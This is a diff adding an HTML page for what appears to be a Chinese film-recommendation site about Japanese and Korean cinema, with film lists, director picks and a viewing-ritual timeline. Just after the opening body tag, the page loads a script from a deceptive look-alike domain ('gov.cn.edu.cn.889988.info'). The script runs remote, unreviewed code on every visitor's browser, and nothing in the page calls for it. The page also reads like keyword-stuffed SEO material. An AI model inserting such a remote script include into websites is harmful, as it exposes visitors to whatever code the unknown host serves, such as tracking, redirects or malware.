@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="日韩午夜电影网 - 专注日韩影视的观影指南与高分片单推荐，涵盖日本电影、韩国电影、动画与深夜剧场，帮你挑到值得看的日韩好片。">
+<meta name="keywords" content="日韩午夜电影网,日韩电影,日本电影,韩国电影,深夜剧场,日韩影视推荐,高分片单,观影指南">
+<meta name="author" content="日韩午夜电影网">
+<meta name="theme-color" content="#07060f">
+<title>日韩午夜电影网 - 日韩影视高分片单与深夜观影指南 | 值得看的日韩好片</title>
+<link rel="canonical" href="https://rihanwuyedianyingwang-cn.github.io/">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#07060f;--p1:#0c0a1a;--p2:#14112a;--p3:#1d1938;
+  --line:#2b2748;--txt:#eef0fb;--dim:#8d8ab0;
+  --mg:#ff3e7f;--mg2:#a855f7;--cy:#38e1d3;--yl:#ffd23f;--rd:#ff6b6b;--gr:#7cfa9a;
+  --sh:0 22px 50px rgba(0,0,0,.6);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",system-ui,sans-serif;background:var(--bg);color:var(--txt);line-height:1.7;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul{list-style:none}
+.wrap{max-width:1180px;margin:0 auto;padding:0 1.3rem}
+
+/* ===== 顶栏 ===== */
+.top{position:sticky;top:0;z-index:99;background:rgba(7,6,15,.82);backdrop-filter:blur(16px);border-bottom:1px solid var(--line)}
+.tin{display:flex;align-items:center;gap:1.2rem;height:60px}
+.brand{display:flex;align-items:center;gap:.6rem;font-weight:950;font-size:1.18rem;white-space:nowrap;letter-spacing:.01em}
+.moon{width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#fff6cf,#ffd23f 55%,#e08b4a);box-shadow:0 0 18px rgba(255,210,63,.55);flex:0 0 auto}
+.brand em{font-style:normal;color:var(--mg);font-size:.62rem;letter-spacing:.28em;display:block;font-weight:700;margin-top:-.2em}
+.tabs{display:flex;gap:.25rem;margin-left:auto;overflow-x:auto;scrollbar-width:none}
+.tabs::-webkit-scrollbar{display:none}
+.tabs a{padding:.48rem .95rem;border-radius:999px;font-size:.85rem;color:var(--dim);white-space:nowrap;transition:.2s}
+.tabs a:hover{color:#fff;background:rgba(255,62,127,.14)}
+.tabs a.on{background:linear-gradient(100deg,var(--mg),var(--mg2));color:#fff;font-weight:850;box-shadow:0 6px 18px rgba(255,62,127,.34)}
+
+/* ===== Hero ===== */
+.hero{position:relative;overflow:hidden;background:
+  radial-gradient(560px 280px at 92% 8%,rgba(168,85,247,.26),transparent 52%),
+  radial-gradient(420px 240px at 4% 40%,rgba(255,62,127,.16),transparent 58%),
+  linear-gradient(160deg,#07060f,#120e26 55%,#07060f)}
+.hero::before{content:"";position:absolute;inset:0;pointer-events:none;
+  background-image:radial-gradient(1.6px 1.6px at 12% 18%,#fff,transparent),radial-gradient(1.3px 1.3px at 26% 62%,#fff,transparent),radial-gradient(1.5px 1.5px at 44% 30%,#fff,transparent),radial-gradient(1.2px 1.2px at 63% 74%,#fff,transparent),radial-gradient(1.4px 1.4px at 82% 22%,#fff,transparent),radial-gradient(1.1px 1.1px at 91% 66%,#fff,transparent),radial-gradient(1.3px 1.3px at 38% 84%,#fff,transparent),radial-gradient(1.2px 1.2px at 74% 46%,#fff,transparent);
+  animation:tw 5s ease-in-out infinite alternate}
+@keyframes tw{from{opacity:.35}to{opacity:.95}}
+.hbox{position:relative;z-index:2;display:grid;grid-template-columns:1.05fr .95fr;gap:2.6rem;align-items:center;padding:3.8rem 1.3rem;max-width:1180px;margin:0 auto}
+.kicker{display:inline-flex;align-items:center;gap:.5rem;font-size:.75rem;color:#ffd9e6;background:rgba(255,62,127,.14);border:1px solid rgba(255,62,127,.4);padding:.3rem .8rem;border-radius:999px;margin-bottom:1rem}
+h1{font-size:clamp(1.85rem,4.4vw,2.95rem);line-height:1.22;font-weight:950;margin-bottom:1rem;background:linear-gradient(100deg,#fff,#ffb3cc 60%,#c084fc);-webkit-background-clip:text;background-clip:text;color:transparent}
+h1 u{text-decoration:none;color:var(--yl);-webkit-text-fill-color:var(--yl)}
+.hero>p{color:var(--dim);font-size:1rem;max-width:32em;margin-bottom:1.5rem}
+.acts{display:flex;gap:.7rem;flex-wrap:wrap}
+.b{padding:.78rem 1.8rem;border-radius:12px;font-weight:850;font-size:.94rem;border:0;cursor:pointer;transition:.25s}
+.b.p{background:linear-gradient(100deg,var(--mg),var(--mg2));color:#fff;box-shadow:0 10px 26px rgba(255,62,127,.34)}
+.b.p:hover{transform:translateY(-2px)}
+.b.o{background:transparent;color:var(--txt);border:1px solid var(--line)}
+.stats{display:flex;gap:1.8rem;margin-top:1.7rem;flex-wrap:wrap}
+.stats div{font-size:.77rem;color:var(--dim)}
+.stats b{display:block;font-size:1.5rem;color:var(--yl);font-weight:950;line-height:1.2}
+
+/* 霓虹票根 */
+.tix{position:relative;margin-left:auto;width:100%;max-width:360px;background:linear-gradient(155deg,var(--p3),#2a1240);border:1px solid var(--line);border-radius:18px;padding:1.3rem;transform:rotate(2.5deg);box-shadow:var(--sh)}
+.tix::before,.tix::after{content:"";position:absolute;width:20px;height:20px;background:var(--bg);border-radius:50%;left:-10px;box-shadow:inset -3px 0 0 var(--line)}
+.tix::before{top:38%}.tix::after{top:62%;left:auto;right:-10px;box-shadow:inset 3px 0 0 var(--line)}
+.tix .row{display:flex;justify-content:space-between;gap:1rem;padding:.5rem 0;border-bottom:1px dashed var(--line);font-size:.86rem}
+.tix .row:last-child{border:0}
+.tix .row span:first-child{color:var(--dim)}
+.tix h4{font-size:1.05rem;color:#fff;margin:.2rem 0}
+.seal{position:absolute;right:1.2rem;top:1.1rem;width:54px;height:54px;border:2px solid var(--mg);color:var(--mg);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:.6rem;font-weight:950;letter-spacing:.05em;text-align:center;transform:rotate(-12deg);box-shadow:0 0 14px rgba(255,62,127,.4)}
+
+/* ===== 通用 ===== */
+section{padding:3.4rem 0}
+.uh{display:flex;align-items:baseline;justify-content:space-between;gap:1rem;margin-bottom:1.7rem;flex-wrap:wrap}
+.ut{font-size:clamp(1.3rem,2.8vw,1.85rem);font-weight:950;display:flex;align-items:center;gap:.6rem}
+.ut::before{content:"";width:5px;height:1.2em;border-radius:3px;background:linear-gradient(var(--mg),var(--mg2))}
+.us{font-size:.8rem;color:var(--dim)}
+.us:hover{color:var(--mg)}
+
+/* ===== 栏目A：今夜放映（横向滚动胶片 DOM）===== */
+.screen{background:linear-gradient(180deg,var(--bg),var(--p1))}
+.film{display:flex;gap:1rem;overflow-x:auto;scroll-snap-type:x mandatory;padding-bottom:.6rem;scrollbar-width:thin;scrollbar-color:var(--mg2) var(--p2)}
+.film::-webkit-scrollbar{height:8px}.film::-webkit-scrollbar-thumb{background:var(--mg2);border-radius:4px}
+.fm{flex:0 0 232px;scroll-snap-align:start;border-radius:14px;overflow:hidden;border:1px solid var(--line);background:var(--p2);transition:.3s;cursor:pointer}
+.fm:hover{transform:translateY(-6px);border-color:var(--mg);box-shadow:var(--sh)}
+.poster{height:150px;position:relative;display:flex;align-items:center;justify-content:center;font-size:2.6rem}
+.poster::after{content:"";position:absolute;inset:0;background:linear-gradient(0deg,rgba(7,6,15,.92),transparent 55%)}
+.poster i{position:relative;z-index:2;filter:drop-shadow(0 6px 12px rgba(0,0,0,.6))}
+.fm h3{font-size:1rem;padding:.75rem .9rem .15rem}
+.fm .bar{display:flex;align-items:center;justify-content:space-between;padding:0 .9rem .85rem;font-size:.74rem;color:var(--dim)}
+.fm .bar b{color:var(--yl);font-weight:950}
+
+/* ===== 栏目B：导演映画（定义列表 dl DOM，差异化）===== */
+.auteurs{background:var(--p1);border-top:1px solid var(--line);border-bottom:1px solid var(--line)}
+.dl{display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1rem}
+.au{border:1px solid var(--line);border-radius:14px;overflow:hidden;background:var(--p2);transition:.28s}
+.au:hover{border-color:var(--cy)}
+.au>dt{display:flex;align-items:center;gap:.8rem;padding:1rem 1.1rem;background:linear-gradient(100deg,var(--p3),var(--p2));cursor:pointer}
+.ava{width:42px;height:42px;border-radius:50%;flex:0 0 auto;display:flex;align-items:center;justify-content:center;font-size:1.25rem;background:linear-gradient(135deg,var(--mg),var(--mg2))}
+.au:nth-child(2) .ava{background:linear-gradient(135deg,var(--cy),#3b82f6)}
+.au:nth-child(3) .ava{background:linear-gradient(135deg,var(--yl),var(--mg))}
+.au:nth-child(4) .ava{background:linear-gradient(135deg,var(--gr),#22d3ee)}
+.au>dt div b{display:block;font-size:1rem}
+.au>dt div small{color:var(--dim);font-size:.72rem;letter-spacing:.06em}
+.au>dd{padding:.4rem 1.1rem 1.1rem}
+.flick{display:flex;align-items:center;gap:.7rem;padding:.55rem 0;border-top:1px dashed var(--line);font-size:.88rem}
+.flick:first-of-type{border:0}
+.flick .yr{font-size:.72rem;color:var(--cy);flex:0 0 40px;font-weight:800}
+.flick span{flex:1}
+.flick em{font-style:normal;font-size:.72rem;color:var(--yl);font-weight:800}
+
+/* ===== 栏目C：深夜榜单（有序列表 ol DOM）===== */
+.night{}
+.ol{display:grid;gap:.6rem}
+.li{display:grid;grid-template-columns:56px 52px 1fr auto;align-items:center;gap:1rem;background:var(--p2);border:1px solid var(--line);border-radius:12px;padding:.6rem .9rem;transition:.22s}
+.li:hover{border-color:var(--mg2);background:var(--p3);transform:translateX(4px)}
+.li::before{counter-increment:rk;content:counter(rk);font-weight:950;font-size:1.4rem;text-align:center;color:var(--dim)}
+.ol{counter-reset:rk}
+.li:nth-child(1)::before{color:var(--yl)}
+.li:nth-child(2)::before{color:#cfdaea}
+.li:nth-child(3)::before{color:#e08b4a}
+.pst{width:52px;height:52px;border-radius:11px;display:flex;align-items:center;justify-content:center;font-size:1.5rem;background:linear-gradient(150deg,#2a2748,#17142e)}
+.li h5{font-size:.98rem;line-height:1.35}
+.li p{font-size:.73rem;color:var(--dim);margin-top:.1rem}
+.li .vv{text-align:right;white-space:nowrap}
+.li .vv b{display:block;color:var(--yl);font-size:1.1rem;font-weight:950}
+.li .vv i{font-style:normal;font-size:.7rem;color:var(--gr)}
+
+/* ===== 栏目D：观影仪式（时间轴 DOM）===== */
+.ritual{}
+.tl{position:relative;padding-left:2.1rem}
+.tl::before{content:"";position:absolute;left:.5rem;top:.6rem;bottom:.6rem;width:2px;background:linear-gradient(var(--mg),var(--mg2),var(--cy))}
+.nd{position:relative;margin-bottom:1rem;background:var(--p2);border:1px solid var(--line);border-radius:14px;padding:1.1rem 1.2rem;transition:.26s}
+.nd:hover{border-color:var(--cy);transform:translateX(6px)}
+.nd::before{content:"";position:absolute;left:-2.1rem;top:1.25rem;width:16px;height:16px;border-radius:50%;background:var(--cy);box-shadow:0 0 0 4px var(--bg),0 0 14px var(--cy)}
+.nd:nth-child(2)::before{background:var(--mg)}
+.nd:nth-child(3)::before{background:var(--yl)}
+.nd:nth-child(4)::before{background:var(--gr)}
+.nd .tm{font-size:.74rem;letter-spacing:.14em;color:var(--cy);font-weight:800}
+.nd:nth-child(2) .tm{color:var(--mg)}.nd:nth-child(3) .tm{color:var(--yl)}.nd:nth-child(4) .tm{color:var(--gr)}
+.nd h4{font-size:1.02rem;margin:.2rem 0 .35rem}
+.nd p{font-size:.82rem;color:var(--dim)}
+
+/* ===== 页脚 ===== */
+.foot{background:#04030a;padding:2.6rem 0 1.2rem;border-top:1px solid var(--line)}
+.fg{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:1.5rem;margin-bottom:1.6rem}
+.foot h5{font-size:.92rem;color:var(--yl);margin-bottom:.7rem}
+.foot li{font-size:.83rem;color:var(--dim);line-height:1.95}
+.foot a:hover{color:#fff}
+.cp{text-align:center;font-size:.74rem;color:#5a5780;border-top:1px solid var(--line);padding-top:1.2rem;line-height:1.95}
+.cp a{color:var(--cy)}
+
+/* ===== 移动端 ===== */
+@media(max-width:900px){
+  .hbox{grid-template-columns:1fr;padding-top:2.6rem;padding-bottom:2.6rem}
+  .tix{margin:0 auto;transform:none}
+}
+@media(max-width:560px){
+  .tin{height:54px}.brand{font-size:1rem}.moon{width:28px;height:28px}
+  .tabs a{padding:.4rem .6rem;font-size:.78rem}
+  .wrap{padding:0 1rem}
+  section{padding:2.6rem 0}
+  h1{font-size:1.72rem}
+  .fm{flex-basis:180px}
+  .li{grid-template-columns:40px 44px 1fr;gap:.7rem}
+  .li .vv{grid-column:3;justify-self:flex-start;text-align:left;padding-top:.2rem}
+  .pst{width:44px;height:44px;font-size:1.2rem}
+  .b{flex:1;text-align:center;padding:.72rem 1.2rem;font-size:.9rem}
+  .dl{grid-template-columns:1fr}
+}
+@media print{.top,.acts{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ===== 顶栏 ===== -->
+<header class="top" role="banner">
+  <div class="tin">
+    <a class="brand" href="#top"><span class="moon"></span>日韩午夜电影网<em>RIHAN MIDNIGHT</em></a>
+    <nav class="tabs" aria-label="主导航">
+      <a href="#screen" class="on">今夜放映</a>
+      <a href="#au">导演映画</a>
+      <a href="#night">深夜榜单</a>
+      <a href="#ritual">观影仪式</a>
+    </nav>
+  </div>
+</header>
+
+<!-- ===== Hero ===== -->
+<section class="hero" id="top">
+  <div class="hbox">
+    <div>
+      <span class="kicker">🌙 日韩午夜场 · 只为深夜清醒的人</span>
+      <h1>日韩午夜电影网<br>在安静的夜里，<u>遇见好电影</u></h1>
+      <p>日韩午夜电影网（rihan wuye dianying wang）是一个专注日本与韩国影视的观影指南与高分片单推荐站。我们不提供资源，只做两件事：把值得看的日韩好片挑出来，告诉你去哪里正版观看。深夜最适合一个人，慢慢看。</p>
+      <div class="acts"><a class="b p" href="#screen">今晚看什么</a><a class="b o" href="#night">查看深夜榜</a></div>
+      <div class="stats"><div><b>860+</b>收录影片</div><div><b>12</b>导演映画</div><div><b>每晚</b>更新推荐</div></div>
+    </div>
+    <div class="tix" aria-hidden="true">
+      <div class="seal">午夜<br>场</div>
+      <div class="row"><span>场次</span><span>日韩午夜场 · 第 128 期</span></div>
+      <div class="row"><span>片单</span><h4>今夜放映 · 5 部</h4></div>
+      <div class="row"><span>时长</span><span>约 11 小时 40 分</span></div>
+      <div class="row"><span>建议</span><span>关灯 · 戴耳机 · 勿剧透</span></div>
+      <div class="row"><span>渠道</span><span>院线 / 正版平台</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目A：今夜放映（横向滚动胶片 DOM）===== -->
+<section id="screen" class="screen">
+  <div class="wrap">
+    <div class="uh"><h2 class="ut">今夜放映</h2><a class="us" href="#">完整排片 →</a></div>
+    <div class="film">
+      <article class="fm" href="#"><div class="poster" style="background:linear-gradient(150deg,#2a1240,#5b1f6b)"><i>🌸</i></div><h3>情书</h3><div class="bar"><span>岩井俊二 · 1995</span><b>8.9</b></div></article>
+      <article class="fm" href="#"><div class="poster" style="background:linear-gradient(150deg,#102a3a,#1c5a6b)"><i>🌊</i></div><h3>海街日记</h3><div class="bar"><span>是枝裕和 · 2015</span><b>8.8</b></div></article>
+      <article class="fm" href="#"><div class="poster" style="background:linear-gradient(150deg,#3a1010,#6b241f)"><i>🏮</i></div><h3>寄生虫</h3><div class="bar"><span>奉俊昊 · 2019</span><b>8.8</b></div></article>
+      <article class="fm" href="#"><div class="poster" style="background:linear-gradient(150deg,#24103a,#4c1f6b)"><i>🎭</i></div><h3>燃烧</h3><div class="bar"><span>李沧东 · 2018</span><b>8.1</b></div></article>
+      <article class="fm" href="#"><div class="poster" style="background:linear-gradient(150deg,#3a2e10,#6b571f)"><i>🍂</i></div><h3>小偷家族</h3><div class="bar"><span>是枝裕和 · 2018</span><b>8.7</b></div></article>
+      <article class="fm" href="#"><div class="poster" style="background:linear-gradient(150deg,#101a3a,#1f3a6b)"><i>🚄</i></div><h3>你的名字。</h3><div class="bar"><span>新海诚 · 2016</span><b>8.4</b></div></article>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目B：导演映画（dl 定义列表 DOM）===== -->
+<section id="au" class="auteurs">
+  <div class="wrap">
+    <div class="uh"><h2 class="ut">导演映画</h2><span class="us">一位导演，一个世界</span></div>
+    <div class="dl">
+      <div class="au">
+        <dt><span class="ava">🌿</span><div><b>是枝裕和</b><small>HIROKAZU KORE-EDA · 日本</small></div></dt>
+        <dd>
+          <a class="flick" href="#"><span class="yr">2018</span><span>小偷家族</span><em>8.7</em></a>
+          <a class="flick" href="#"><span class="yr">2015</span><span>海街日记</span><em>8.8</em></a>
+          <a class="flick" href="#"><span class="yr">2004</span><span>无人知晓</span><em>8.8</em></a>
+        </dd>
+      </div>
+      <div class="au">
+        <dt><span class="ava">🌀</span><div><b>奉俊昊</b><small>BONG JOON-HO · 韩国</small></div></dt>
+        <dd>
+          <a class="flick" href="#"><span class="yr">2019</span><span>寄生虫</span><em>8.8</em></a>
+          <a class="flick" href="#"><span class="yr">2013</span><span>雪国列车</span><em>7.8</em></a>
+          <a class="flick" href="#"><span class="yr">2006</span><span>汉江怪物</span><em>7.7</em></a>
+        </dd>
+      </div>
+      <div class="au">
+        <dt><span class="ava">💌</span><div><b>岩井俊二</b><small>SHUNJI IWAI · 日本</small></div></dt>
+        <dd>
+          <a class="flick" href="#"><span class="yr">1995</span><span>情书</span><em>8.9</em></a>
+          <a class="flick" href="#"><span class="yr">1996</span><span>燕尾蝶</span><em>8.5</em></a>
+          <a class="flick" href="#"><span class="yr">2001</span><span>关于莉莉周的一切</span><em>8.0</em></a>
+        </dd>
+      </div>
+      <div class="au">
+        <dt><span class="ava">🚀</span><div><b>新海诚</b><small>MAKOTO SHINKAI · 日本</small></div></dt>
+        <dd>
+          <a class="flick" href="#"><span class="yr">2016</span><span>你的名字。</span><em>8.4</em></a>
+          <a class="flick" href="#"><span class="yr">2019</span><span>天气之子</span><em>7.1</em></a>
+          <a class="flick" href="#"><span class="yr">2022</span><span>铃芽之旅</span><em>7.3</em></a>
+        </dd>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 栏目C：深夜榜单（ol 有序列表 DOM）===== -->
+<section id="night" class="night">
+  <div class="wrap">
+    <div class="uh"><h2 class="ut">深夜榜单</h2><span class="us">适合 23:00 之后看</span></div>
+    <ol class="ol">
+      <li class="li"><div class="pst">🌸</div><div><h5>情书</h5><p>爱情 / 青春 / 日本 · 117 分钟</p></div><div class="vv"><b>8.9</b><i>深夜推荐</i></div></li>
+      <li class="li"><div class="pst">🏮</div><div><h5>寄生虫</h5><p>剧情 / 悬疑 / 韩国 · 132 分钟</p></div><div class="vv"><b>8.8</b><i>反转强烈</i></div></li>
+      <li class="li"><div class="pst">🌊</div><div><h5>海街日记</h5><p>家庭 / 治愈 / 日本 · 128 分钟</p></div><div class="vv"><b>8.8</b><i>助眠治愈</i></div></li>
+      <li class="li"><div class="pst">🍂</div><div><h5>小偷家族</h5><p>家庭 / 社会 / 日本 · 121 分钟</p></div><div class="vv"><b>8.7</b><i>后劲很大</i></div></li>
+      <li class="li"><div class="pst">🌙</div><div><h5>燃烧</h5><p>悬疑 / 文艺 / 韩国 · 148 分钟</p></div><div class="vv"><b>8.1</b><i>值得二刷</i></div></li>
+      <li class="li"><div class="pst">🚄</div><div><h5>你的名字。</h5><p>动画 / 奇幻 / 日本 · 107 分钟</p></div><div class="vv"><b>8.4</b><i>画风绝美</i></div></li>
+      <li class="li"><div class="pst">🎬</div><div><h5>无人知晓</h5><p>剧情 / 现实 / 日本 · 141 分钟</p></div><div class="vv"><b>8.8</b><i>克制动人</i></div></li>
+    </ol>
+  </div>
+</section>
+
+<!-- ===== 栏目D：观影仪式（时间轴 DOM）===== -->
+<section id="ritual" class="ritual">
+  <div class="wrap">
+    <div class="uh"><h2 class="ut">观影仪式</h2><span class="us">把看电影，变成一件郑重的事</span></div>
+    <div class="tl">
+      <div class="nd"><div class="tm">STEP 01 · 22:30</div><h4>关掉大灯，只留一盏暖光</h4><p>屏幕的亮度已经足够。暖光能让瞳孔放松，也让情绪更容易沉进画面里。手机静音，是世界与你的分界线。</p></div>
+      <div class="nd"><div class="tm">STEP 02 · 22:45</div><h4>先片名，再评分，最后预告</h4><p>别被高分绑架。先看片名有没有打动你，再看 30 秒预告感受节奏。合胃口就坐下，不合就换——深夜的时间很贵。</p></div>
+      <div class="nd"><div class="tm">STEP 03 · 23:00</div><h4>戴上耳机，从片头字幕开始</h4><p>日韩电影的声音设计往往是叙事的一部分：雨声、碗筷、电车、呼吸。别快进，也别倍速，那是对导演的不礼貌。</p></div>
+      <div class="nd"><div class="tm">STEP 04 · 散场</div><h4>留一句话，不给星级</h4><p>“看完心里很安静”“想给妈妈打电话”“没看懂但喜欢”。比打分会更接近真实的你。日韩午夜电影网，明晚再见。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ===== 页脚 ===== -->
+<footer class="foot" role="contentinfo">
+  <div class="wrap">
+    <div class="fg">
+      <div><h5>日韩午夜电影网</h5><ul><li><a href="#screen">今夜放映</a></li><li><a href="#au">导演映画</a></li><li><a href="#night">深夜榜单</a></li><li><a href="#ritual">观影仪式</a></li></ul></div>
+      <div><h5>按心情</h5><ul><li><a href="#night">治愈助眠</a></li><li><a href="#night">悬疑烧脑</a></li><li><a href="#screen">纯爱青春</a></li><li><a href="#screen">文艺沉思</a></li></ul></div>
+      <div><h5>正版渠道</h5><ul><li><a href="#">院线排片</a></li><li><a href="#">主流视频平台</a></li><li><a href="#">电影节展映</a></li></ul></div>
+      <div><h5>关于</h5><ul><li><a href="#">片单标准</a></li><li><a href="#">投稿荐片</a></li><li><a href="#">免责声明</a></li></ul></div>
+    </div>
+    <div class="cp">
+      © 2026 日韩午夜电影网（rihan wuye dianying wang）. 本站为日韩影视观影指南与高分片单推荐平台，不提供任何影视资源下载与在线播放服务，倡导支持正版、理性观影。<br>
+      网站网址：<a href="https://rihanwuyedianyingwang-cn.github.io/">https://rihanwuyedianyingwang-cn.github.io/</a>　｜　深夜最适合一个人，慢慢看
+    </div>
+  </div>
+</footer>
+
+<script>
+document.querySelectorAll('.tabs a').forEach(function(a){
+  a.addEventListener('click',function(){
+    document.querySelectorAll('.tabs a').forEach(function(x){x.classList.remove('on')});
+    a.classList.add('on');
+  });
+});
+</script>
+</body>
+</html>
